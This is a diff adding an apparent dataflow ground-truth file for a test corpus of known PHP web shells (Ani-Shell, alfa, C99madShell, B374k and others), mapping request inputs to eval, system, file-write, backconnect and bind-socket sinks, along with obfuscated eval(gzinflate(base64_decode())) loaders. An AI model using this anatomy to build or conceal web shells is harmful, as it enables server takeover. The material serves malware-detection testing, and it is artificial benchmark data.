@@ -1,0 +1,1035 @@
+/mnt/games/normtest/s3/php/001_haha.php	14	file-open	16	data-decode	must	file_get_contents("php://input") 14 -> $m (preg_match) -> base64_decode($m[1]) 16
+/mnt/games/normtest/s3/php/001_haha.php	16	data-decode	16	data-decode	may	base64_decode 16 -> x() (defined in file, XOR with $k) -> gzuncompress 16
+/mnt/games/normtest/s3/php/001_haha.php	16	data-decode	16	data-eval	must	gzuncompress(...) nested in eval(...) 16
+/mnt/games/normtest/s3/php/001_haha.php	14	file-open	16	data-eval	may	request body 14 -> decode chain -> eval 16 (through x())
+/mnt/games/normtest/s3/php/002_hehe.php	0	-	0	-	none	only include "phar://".basename(__FILE__)."/x" (line 1, lib-load) and a binary phar after __HALT_COMPILER; no other node, nothing reaches it
+/mnt/games/normtest/s3/php/003_hoho.php	11	data-call	11	data-call	must	$l=str_replace(...)="create_function" (9), $s=$l('',$U) 11 builds function from the T|-stripped text; $s() 11 calls it; body text not readable as nodes
+/mnt/games/normtest/s3/php/004_hoho_1.php	12	data-call	12	data-call	must	$W=str_replace(...)="create_function" (6), $K=$W('',$u) 12; $K() 12 calls the created function; body is string text
+/mnt/games/normtest/s3/php/005_hoho_2.php	10	data-call	10	data-call	must	$M=str_replace(...)="create_function" (8), $T=$M('',$e) 10; $T() 10; body is string text
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	10	data-decode	10	data-eval	must	eval(base64_decode(literal)) 10; decoded text is session_start/ini_set/mail logger, no node
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	63	input-request	63	data-call	must	$_GET[filesrc] 63 passed to $__fgetcon7s (value callee = file_get_contents)
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	50	input-request	50	file-write	must	$_FILES[file][tmp_name] and name 50 -> copy 50
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	68	input-request	68	file-rename	must	$_POST[path], $_POST[newname] 68 -> rename 68
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	78	input-request	78	file-open	must	$_POST[path] 78 -> fopen 78
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	79	input-request	79	file-write	must	$_POST[src] 79 -> fwrite 79
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	78	file-open	79	file-write	must	$fp = fopen 78 -> fwrite($fp,...) 79
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	86	input-request	86	data-call	must	$_POST[path] 86 -> $__fgetcon7s (file_get_contents) 86
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	93	input-request	93	data-call	must	$_POST[path] 93 -> $rm__dir (= "rmdir", line 15) 93
+/mnt/games/normtest/s3/php/025_0byt3m1n1.php	99	input-request	99	data-call	must	$_POST[path] 99 -> $un__link (= "unlink", line 16) 99
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	885	input-request	680	proc-start	may	$_GET[cmd] 885 -> exec_all($command) -> exec 680
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	885	input-request	686	proc-start	may	$_GET[cmd] 885 -> exec_all -> shell_exec 686
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	885	input-request	691	proc-start	may	$_GET[cmd] 885 -> exec_all -> popen 691
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	885	input-request	716	proc-start	may	$_GET[cmd] 885 -> exec_all -> system 716
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	885	input-request	724	proc-start	may	$_GET[cmd] 885 -> exec_all -> passthru 724
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	885	input-request	734	proc-start	may	$_GET[cmd] 885 -> exec_all -> proc_open 734
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1225	input-request	1231	data-eval	must	$code = str_replace(..., $_POST[code]) 1225 -> eval($code) 1231
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1261	input-request	1263	file-write	must	$_FILES[file][tmp_name] 1261 -> $tempName -> move_uploaded_file 1263
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1180	file-open	1184	file-write	must	$fd = fopen("r00t.pl","w") 1180 -> fwrite($fd, ...) 1184
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1184	data-decode	1184	file-write	must	fwrite($fd, base64_decode($r00t)) 1184
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1324	input-request	1356	file-write	may	$_GET[message] 1324 -> $message -> fwrite 1356 (injector)
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1322	input-request	1354	file-open	may	$_GET[dir] 1322 -> $dir -> fopen($dir.$file,$mode) 1354
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1354	file-open	1356	file-write	must	$fd = fopen 1354 -> fwrite($fd,$message) 1356
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1573	input-request	1575	net-connect	must	$_POST[ip] 1573 / $_POST[port] 1574 -> fsockopen 1575
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1575	net-connect	1586	file-write	must	$sockfd = fsockopen 1575 -> fputs($sockfd,...) 1586 (backconnect banner)
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1575	net-connect	1601	file-write	must	$sockfd 1575 -> fputs($sockfd, ... exec_all($command)) 1601
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1621	file-open	1625	file-write	must	$fd = fopen("bind.py","w") 1621 -> fwrite 1625
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1625	data-decode	1625	file-write	must	fwrite($fd, base64_decode($Python_CODE)) 1625
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1677	net-open	1683	net-bind	must	$sockfd = socket_create 1677 -> socket_bind($sockfd,...) 1683
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1683	net-bind	1688	net-listen	must	socket_bind($sockfd) 1683 then socket_listen($sockfd) 1688 (same socket)
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1688	net-listen	1694	net-accept	must	socket_listen($sockfd) 1688 -> socket_accept($sockfd) 1694
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1694	net-accept	1699	net-read	must	$client = socket_accept 1694 -> socket_read($client) 1699
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1822	input-request	1851	net-connect	must	$_GET[ip] 1822 -> $IP -> fsockopen("$mode://$IP") 1851 (fuzzer)
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1851	net-connect	1854	file-write	must	$socket = fsockopen 1851 -> fwrite($socket,$data) 1854
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1950	input-request	1968	net-connect	must	$_GET[ip] 1950 -> $IP -> fsockopen("udp://$IP") 1968 (dos)
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	1968	net-connect	1971	file-write	must	$socket = fsockopen 1968 -> fwrite($socket,$data) 1971
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2236	input-request	2236	file-open	must	$_POST[file] 2236 -> fopen 2236
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2239	input-request	2239	file-write	must	$_POST[content] 2239 -> fwrite 2239
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2236	file-open	2239	file-write	must	$handle = fopen 2236 -> fwrite($handle,...) 2239
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2256	input-request	2260	data-eval	must	$_POST[code] 2256 -> base64_encode(gzdeflate()) -> $encoded -> eval(gzinflate(base64_decode($encoded))) 2260 (obfuscate tool)
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2260	data-decode	2260	data-decode	must	eval(gzinflate(base64_decode($encoded))) 2260: base64_decode -> gzinflate
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2260	data-decode	2260	data-eval	must	gzinflate(...) nested in eval 2260
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2293	input-request	2293	file-open	must	$_GET[open] 2293 -> file_get_contents 2293
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2323	input-request	2323	file-rename	must	$_GET[rename],$_GET[to] 2323 -> rename 2323
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2387	input-request	2387	file-delete	must	$_GET[delete] 2387 -> unlink 2387
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	2395	input-request	2395	file-delete	must	$_GET[delete] 2395 -> rmdir 2395
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	74	input-request	67	file-open	may	$_GET[zip] 74 -> $src -> Zip($src,$dst) 76 (defined in file) -> file_get_contents($source) 67
+/mnt/games/normtest/s3/php/026_Ani-Shell.php	74	input-request	77	file-open	may	$_GET[zip] 74-75 -> $dst -> Zip() 76 -> file_get_contents($dst) 77
+/mnt/games/normtest/s3/php/027_Antichat_Shell_v1.3.php	26	input-request	34	file-open	may	$_POST[file] 26 -> $file (also set to "" in else) -> readfile($file) 34
+/mnt/games/normtest/s3/php/027_Antichat_Shell_v1.3.php	75	input-request	60	proc-start	may	$_POST[command] 75 -> shell($cmd) (defined in file) -> popen($cmd) 60
+/mnt/games/normtest/s3/php/027_Antichat_Shell_v1.3.php	170	input-request	161	file-write	may	$_POST[data] 170 -> writef($file,$data) -> fwrite($fp,$data) 161
+/mnt/games/normtest/s3/php/027_Antichat_Shell_v1.3.php	170	input-request	160	file-open	may	$file 26 from $_POST[file] -> writef($file,...) 170 -> fopen($file,"w+") 160
+/mnt/games/normtest/s3/php/027_Antichat_Shell_v1.3.php	160	file-open	161	file-write	must	$fp = fopen 160 -> fwrite($fp,$data) 161
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	119	input-request	135	file-open	may	$_POST[file] 119 -> $file -> readfile($file) 135
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	119	input-request	141	file-delete	may	$_POST[file] 119 -> $file -> unlink($file) 141
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	119	input-request	147	file-delete	may	$_POST[file] 119 -> $file -> rmdir($file) 147
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	196	input-request	181	proc-start	may	$_POST[command] 196 -> shell($cmd) -> popen($cmd) 181
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	331	input-request	181	proc-start	may	$_POST[urldown], $_POST[filename] 331 -> shell(which(wget)." ".urldown." -O ".filename) -> popen 181
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	296	input-request	287	file-write	may	$_POST[data] 296 -> writef($file,$data) -> fwrite($fp,$data) 287
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	286	file-open	287	file-write	must	$fp = fopen 286 -> fwrite($fp,$data) 287
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	322	input-request	322	file-write	must	$_FILES[file][tmp_name] 322 -> move_uploaded_file 322
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	318	input-request	322	file-write	may	$_POST[filename] 318 -> $uploadfile (set at 317 and 318) -> move_uploaded_file($tempname,$uploadfile) 322
+/mnt/games/normtest/s3/php/028_Antichat_Shell.php	363	input-request	363	data-eval	must	$_POST[phpev] 363 -> eval 363
+/mnt/games/normtest/s3/php/029_B374k_Beta_ShElL_V1.php	433	data-decode	433	data-decode	must	eval(gzinflate(base64_decode($code))) 433: base64_decode -> gzinflate; $code is a large base64 literal (not decoded by reading)
+/mnt/games/normtest/s3/php/029_B374k_Beta_ShElL_V1.php	433	data-decode	433	data-eval	must	gzinflate(...) nested in eval 433; hidden payload not readable
+/mnt/games/normtest/s3/php/030_C99madShell_v._2.0_madnet_edition.php	6	data-decode	6	data-decode	must	eval(gzinflate(base64_decode("..."))) 6: base64_decode -> gzinflate; whole file is this one line (44 KB literal), hidden part not read
+/mnt/games/normtest/s3/php/030_C99madShell_v._2.0_madnet_edition.php	6	data-decode	6	data-eval	must	gzinflate(...) nested in eval 6
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	210	input-request	190	file-open	may	$_GET[downloadfile] 210 -> downloadfile($file) (defined in file) -> readfile("$file") 190
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	211	input-request	195	file-open	may	$_GET[mailfile] 211 -> anonim_mail(...,$file) -> fopen($file,"rb") 195
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	436	input-request	438	file-open	must	$edit=$_REQUEST[edit] 436 -> fopen($edit,"r") 438
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	436	input-request	472	file-open	must	$edit=$_REQUEST[edit] 436 -> readfile($edit) 472
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	75	input-request	482	file-open	may	POST/GET copied into globals by $$key=$value (75-76); $nameoffile -> fopen("$nameoffile","w") 482
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	482	file-open	483	file-write	must	$f = fopen 482 -> fwrite($f,"$texoffile") 483
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	492	input-request	494	file-delete	must	$delfile=$_REQUEST[delfile] 492 -> unlink("$delfile") 494
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	570	input-request	576	file-rename	must	$rto=$_POST[rto] 570 -> $to1 -> rename($fr1,$to1) 576
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	664	file-open	665	file-write	must	$f = fopen("$d/$bfileneme","w+") 664 -> fwrite($f,$script) 665
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	665	file-write	667	proc-start	shared	path "$d/$bfileneme": written 665 then system("perl $d/$bfileneme") 667
+/mnt/games/normtest/s3/php/031_Cyber_Shell.php	76	input-request	697	proc-start	may	$cmd comes from GET/POST by $$key=$value (75-76); system($cmd) 697
+/mnt/games/normtest/s3/php/032_G6.php	142	input-request	147	file-open	must	$sourcefile=$_REQUEST[readfile] 142 -> file_get_contents($sourcefile) 147
+/mnt/games/normtest/s3/php/032_G6.php	142	input-request	156	file-open	must	$sourcefile 142 -> fopen($sourcefile,"w") 156
+/mnt/games/normtest/s3/php/032_G6.php	155	input-request	157	file-write	must	$new_source=$_POST[sourcecode] 155 -> fwrite($source_edit,$new_source) 157
+/mnt/games/normtest/s3/php/032_G6.php	156	file-open	157	file-write	must	$source_edit = fopen 156 -> fwrite 157
+/mnt/games/normtest/s3/php/032_G6.php	242	input-request	244	net-connect	must	$ip=$_POST[ip] 242, $port=$_POST[port] 243 -> fsockopen($ip,$port) 244 (backconnect)
+/mnt/games/normtest/s3/php/032_G6.php	244	net-connect	247	file-write	must	$sockfd = fsockopen 244 -> fputs($sockfd,...shell_exec($command)...) 247
+/mnt/games/normtest/s3/php/032_G6.php	365	input-request	365	file-write	must	$_FILES[file][tmp_name] 365 -> move_uploaded_file 365
+/mnt/games/normtest/s3/php/032_G6.php	88	input-request	431	file-delete	must	$delete=$_GET[delete] 88 -> unlink($delete) 431
+/mnt/games/normtest/s3/php/032_G6.php	88	input-request	431	file-delete	must	$delete=$_GET[delete] 88 -> rmdir($delete) 431
+/mnt/games/normtest/s3/php/032_G6.php	91	input-request	416	file-open	may	$currentDirectoryFileDl=$_GET[downlfile] 91 -> forceDL($filePath,..) 382 -> readfile($filePath) 416
+/mnt/games/normtest/s3/php/032_G6.php	465	input-request	465	proc-start	must	$_POST[command] 465 -> exec 465
+/mnt/games/normtest/s3/php/032_G6.php	472	input-request	472	proc-start	must	$_POST[command] 472 -> passthru 472
+/mnt/games/normtest/s3/php/032_G6.php	478	input-request	478	proc-start	must	$_POST[command] 478 -> system 478
+/mnt/games/normtest/s3/php/032_G6.php	518	input-request	518	data-eval	must	$_POST[phpeval] 518 -> eval 518
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	145	input-request	145	data-call	must	$_FILES[n][tmp_name] 145 -> $GNJ[5] = copy 145
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	180	input-request	180	data-call	must	$_GET[s] 180 -> $GNJ[6] = file_get_contents 180
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	232	input-request	232	data-call	must	$_POST[e] 232 -> $GNJ[7] = base64_decode 232
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	232	data-call	238	data-call	may	$ex = $GNJ[7](...) 232 (or $_POST[e] 235) -> $GNJ[18] = fwrite($fp,$ex) 238
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	235	input-request	238	data-call	may	$ex = $_POST[e] 235 (other branch) -> $GNJ[18] = fwrite 238
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	237	input-request	237	data-call	must	$_GET[e] 237 -> $GNJ[17] = fopen 237
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	237	data-call	238	data-call	must	$fp = $GNJ[17] (fopen) 237 -> $GNJ[18] (fwrite)($fp,$ex) 238
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	289	input-request	289	data-call	must	$_GET[k] 289 -> $GNJ[12] = chmod 289
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	304	input-request	304	data-call	must	$_POST[l] 304 -> $GNJ[11] = mkdir 304
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	329	input-request	329	data-call	must	$_POST[n] 329 -> $GNJ[25] = touch 329
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	348	input-request	348	data-call	must	$_GET[r], $_POST[r] 348 -> $GNJ[27] = rename 348
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	248	input-request	520	data-call	may	$_GET[x] 248 -> rec() -> $GNJ[10] = unlink 520
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	599	input-request	599	data-call	must	$_GET[g] 599 -> $GNJ[37] = readfile 599
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	196	input-request	526	data-call	may	$_POST[1],$_POST[2] 196 -> dre($y1,$y2) -> $y1($y2) 526 (callee from the request)
+/mnt/games/normtest/s3/php/033_MARIJUANA.php	526	data-call	526	data-call	must	$GNJ[16](var_dump)($y1($y2)) 526: result of dynamic call passed to the second
+/mnt/games/normtest/s3/php/034_UnknownSec.php	21	input-request	21	file-open	must	$_POST[path] 21 -> file_get_contents 21
+/mnt/games/normtest/s3/php/034_UnknownSec.php	114	input-request	106	proc-start	may	$cmd=$_POST[cmd] 114 -> ekseCMD($cmd,$method) 373 -> exec($cmd,$output) 106
+/mnt/games/normtest/s3/php/034_UnknownSec.php	114	input-request	110	proc-start	may	$cmd=$_POST[cmd] 114 -> ekseCMD -> shell_exec($cmd) 110
+/mnt/games/normtest/s3/php/034_UnknownSec.php	265	input-request	233	file-write	may	$_POST[d_file],$_POST[script] 265 -> mass_kabeh($dir,$namafile,$isi_script) -> file_put_contents($▚,$isi_script) 233
+/mnt/games/normtest/s3/php/034_UnknownSec.php	269	input-request	255	file-write	may	$_POST[d_file],$_POST[script] 269 -> mass_biasa -> file_put_contents 255
+/mnt/games/normtest/s3/php/034_UnknownSec.php	440	input-request	429	file-delete	may	$_POST[d_dir],$_POST[d_file] 440 -> hapus_massal -> unlink($▚) 429
+/mnt/games/normtest/s3/php/034_UnknownSec.php	388	input-request	388	file-write	must	$_FILES[file][tmp_name] 388 -> copy 388
+/mnt/games/normtest/s3/php/034_UnknownSec.php	461	input-request	461	file-open	must	$_GET[filesrc] 461 -> file_get_contents 461
+/mnt/games/normtest/s3/php/034_UnknownSec.php	468	input-request	468	file-perm-set	must	$_POST[path],$_POST[perm] 468 -> chmod 468
+/mnt/games/normtest/s3/php/034_UnknownSec.php	516	input-request	516	file-rename	must	$_POST[path],$_POST[newname] 516 -> rename 516
+/mnt/games/normtest/s3/php/034_UnknownSec.php	551	input-request	551	file-open	must	$_POST[path] 551 -> fopen 551
+/mnt/games/normtest/s3/php/034_UnknownSec.php	552	input-request	552	file-write	must	$_POST[src] 552 -> fwrite 552
+/mnt/games/normtest/s3/php/034_UnknownSec.php	551	file-open	552	file-write	must	$fp = fopen 551 -> fwrite($fp,..) 552
+/mnt/games/normtest/s3/php/034_UnknownSec.php	574	input-request	574	file-open	must	$_POST[path] 574 -> file_get_contents 574
+/mnt/games/normtest/s3/php/034_UnknownSec.php	584	input-request	584	file-delete	must	$_POST[path] 584 -> rmdir 584
+/mnt/games/normtest/s3/php/034_UnknownSec.php	606	input-request	606	file-delete	must	$_POST[path] 606 -> unlink 606
+/mnt/games/normtest/s3/php/035_adminer-4.8.1-en.php	96	input-request	98	file-open	must	get_file(): $Xc=$_FILES[$z] 96 -> $li=$Xc["tmp_name"] -> file_get_contents($li) 98 (adminer, minified, large file)
+/mnt/games/normtest/s3/php/035_adminer-4.8.1-en.php	1419	file-open	1419	data-load	must	unserialize(file_get_contents($q)) 1419 (adminer.version cache)
+/mnt/games/normtest/s3/php/035_adminer-4.8.1-en.php	1472	file-open	1472	data-load	must	unserialize(@file_get_contents(get_temp_dir()."/adminer.invalid")) 1472
+/mnt/games/normtest/s3/php/035_adminer-4.8.1-en.php	136	file-open	136	file-write	must	password_file(): $ld=fopen($q,"w") 136 -> fwrite($ld,$I) 136 (adminer.key)
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3	data-decode	3	data-decode	must	eval(str_rot13(gzinflate(str_rot13(base64_decode(literal))))) 3: base64_decode ... gzinflate; payload hidden
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3	data-decode	3	data-eval	must	...gzinflate(...) -> str_rot13 -> eval 3
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3593	input-request	758	proc-start	may	echo alfaEx($cmd.$_POST[alfa1]) 3593 -> alfaEx($in) 739 -> _alfa_php_cmd($in) -> exec($in) 758
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3809	input-request	758	proc-start	may	alfaEx($tmpdir."/bcwin.exe ".$_POST[alfa2]." ".$_POST[alfa3]) 3809 -> _alfa_php_cmd -> exec 758
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	6236	input-request	758	proc-start	may	alfaEx($cmd.$_POST[alfa1],true) 6236 -> _alfa_php_cmd -> exec 758
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3314	input-request	3314	data-eval	must	$_POST[alfa1] 3314 -> eval("?>".$_POST[alfa1])
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3367	input-request	3370	data-eval	must	$alg=$_POST[alfa1] 3367 -> $code=str_replace(...,$alg) -> eval("echo ".$code.";") 3370
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3006	input-request	3006	file-open	must	$_POST[alfa1] 3006 -> fopen($_POST[alfa1],"w")
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3080	input-request	3080	file-perm-set	must	$_POST[alfa1] 3080 -> touch 3080
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3091	input-request	3091	file-open	must	$_POST[alfa1] 3091 -> highlight_file 3091
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3099	input-request	3099	file-delete	must	$_POST[alfa1] 3099 -> unlink 3099
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3116	input-request	3116	file-perm-set	must	$_POST[alfa1] 3116 -> chmod 3116
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3174	input-request	3174	file-rename	must	$_POST[alfa1],$_POST[alfa3] 3174 -> rename 3174
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	3256	input-request	3256	file-open	must	$_POST[file] 3256 -> readfile 3256
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	2684	input-request	2684	data-decode	must	rawurldecode(@$_POST[alfa2]) 2684
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	2684	data-decode	2684	file-delete	must	unlink(rawurldecode(@$_POST[alfa2])) 2684
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	836	input-request	836	file-write	must	$_FILES[file][tmp_name] 836 -> move_uploaded_file 836
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	2573	input-request	2573	data-load	must	unserialize($_COOKIE[alfa_f]) 2573
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	2713	input-request	2713	file-rename	must	rename($_COOKIE[alfa_c].$f, ...) 2713
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	6270	input-request	6270	file-perm-set	must	$_POST[alfa1] 6270 -> chmod 6270
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	6297	input-request	6297	file-rename	must	$_POST[alfa1],$_POST[alfa2] 6297 -> rename 6297
+/mnt/games/normtest/s3/php/036_alfa-shell-v4.1-tesla.php	6323	input-request	6323	file-write	must	$_POST[alfa1],$_POST[alfa2] 6323 -> copy 6323
+/mnt/games/normtest/s3/php/037_alfa.php	11	data-decode	11	data-decode	must	eval(str_rot13(gzinflate(str_rot13(base64_decode(literal))))) 11: base64_decode ... gzinflate; payload hidden; file 320 KB
+/mnt/games/normtest/s3/php/037_alfa.php	11	data-decode	11	data-eval	must	...gzinflate(...) -> str_rot13 -> eval 11
+/mnt/games/normtest/s3/php/037_alfa.php	3922	input-request	574	proc-start	may	echo alfaEx($cmd.$_POST[alfa1]) 3922 -> alfaEx 555 -> _alfa_php_cmd 569 -> exec($in) 574
+/mnt/games/normtest/s3/php/037_alfa.php	4138	input-request	574	proc-start	may	alfaEx($tmpdir."/bcwin.exe ".$_POST[alfa2]." ".$_POST[alfa3]) 4138 -> exec 574
+/mnt/games/normtest/s3/php/037_alfa.php	3637	input-request	3637	data-eval	must	$_POST[alfa1] 3637 -> eval 3637
+/mnt/games/normtest/s3/php/037_alfa.php	3696	input-request	3699	data-eval	must	$alg=$_POST[alfa1] 3696 -> $code -> eval("echo ".$code.";") 3699
+/mnt/games/normtest/s3/php/037_alfa.php	3397	input-request	3397	file-open	must	$_POST[alfa1] 3397 -> highlight_file 3397
+/mnt/games/normtest/s3/php/037_alfa.php	3405	input-request	3405	file-delete	must	$_POST[alfa1] 3405 -> unlink 3405
+/mnt/games/normtest/s3/php/037_alfa.php	3422	input-request	3422	file-perm-set	must	$_POST[alfa1] 3422 -> chmod 3422
+/mnt/games/normtest/s3/php/037_alfa.php	3459	input-request	3459	file-perm-set	must	$_POST[alfa1] 3459 -> touch 3459
+/mnt/games/normtest/s3/php/037_alfa.php	3507	input-request	3507	file-rename	must	$_POST[alfa1],$_POST[alfa3] 3507 -> rename 3507
+/mnt/games/normtest/s3/php/037_alfa.php	3589	input-request	3589	file-open	must	$_POST[file] 3589 -> readfile 3589
+/mnt/games/normtest/s3/php/037_alfa.php	3097	input-request	3097	data-decode	must	rawurldecode(@$_POST[alfa2]) 3097
+/mnt/games/normtest/s3/php/037_alfa.php	3097	data-decode	3097	file-delete	must	unlink(rawurldecode(@$_POST[alfa2])) 3097
+/mnt/games/normtest/s3/php/037_alfa.php	652	input-request	652	file-write	must	$_FILES[file][tmp_name] 652 -> move_uploaded_file 652
+/mnt/games/normtest/s3/php/037_alfa.php	3030	input-request	3030	data-load	must	unserialize($_COOKIE[f]) 3030
+/mnt/games/normtest/s3/php/037_alfa.php	6186	input-request	6186	data-call	may	call_user_func("alfa".$_POST[a]) 6186; $_POST[a] set to a default when empty (6182-6184)
+/mnt/games/normtest/s3/php/038_alfa_mini_byp.php	1	data-decode	1	data-eval	must	eval("?>".base64_decode("...")) line 1; the whole 6.6 KB file is this literal, payload not read
+/mnt/games/normtest/s3/php/039_alfabypass.php	26	http-open	36	http-fetch	may	curl_init("$url") 26 -> $ch (set through ${$GLOBALS[..]} and $ch) -> curl_exec($ch) 36
+/mnt/games/normtest/s3/php/039_alfabypass.php	36	http-fetch	40	data-eval	may	curl_exec 36 -> get_contents() return -> ${$GLOBALS["ltnbuthggrc"]}="a" assigned 39 -> eval("?>".$a) 40 (fetched jpg url at 39)
+/mnt/games/normtest/s3/php/040_alfateslav4.php	3	data-decode	3	data-decode	must	eval(str_rot13(gzinflate(str_rot13(base64_decode(literal))))) 3: base64_decode ... gzinflate; payload hidden
+/mnt/games/normtest/s3/php/040_alfateslav4.php	3	data-decode	3	data-eval	must	...gzinflate(...) -> str_rot13 -> eval 3
+/mnt/games/normtest/s3/php/040_alfateslav4.php	17	data-call	17	data-call	must	$zvlozWlZJVG="cre"."ate_"."func"."tion" then $hZoATTNgrgjhy=$zvlozWlZJVG('$Et',"eval(gzinflate(XfL...($Et)));") ; $hZoATTNgrgjhy("...") calls it, line 17 (178 KB), the string is not nodes
+/mnt/games/normtest/s3/php/040_alfateslav4.php	4	input-request	4	file-open	must	@file_get_contents(@$_REQUEST["404"]) 4 (hex-escaped line, after px password md5 check)
+/mnt/games/normtest/s3/php/040_alfateslav4.php	4	file-open	4	data-eval	must	echo @eval(@file_get_contents(@$_REQUEST["404"])) 4
+/mnt/games/normtest/s3/php/040_alfateslav4.php	4	input-request	4	data-eval	must	$_REQUEST["404"] -> file_get_contents -> eval, all inside one expression 4
+/mnt/games/normtest/s3/php/040_alfateslav4.php	4	file-open	4	file-write	may	$folder=fopen($file,"w") then @fwrite($folder,$a) 4 through variable-variables ($file = $p."/robots.php")
+/mnt/games/normtest/s3/php/040_alfateslav4.php	4	file-perm-set	4	file-open	shared	touch($file) and fopen($file,"w") 4: same $file = $p."/robots.php"
+/mnt/games/normtest/s3/php/040_alfateslav4.php	4	data-decode	4	file-open	must	file_get_contents(base64_decode("")."=".$lld.base64_decode("")."=".$brow) 4: both base64_decode results are arguments of file_get_contents
+/mnt/games/normtest/s3/php/042_alfav4.php	3	data-decode	3	data-decode	must	eval(str_rot13(gzinflate(str_rot13(base64_decode(literal))))) 3: base64_decode ... gzinflate; payload hidden
+/mnt/games/normtest/s3/php/042_alfav4.php	3	data-decode	3	data-eval	must	...gzinflate(...) -> str_rot13 -> eval 3
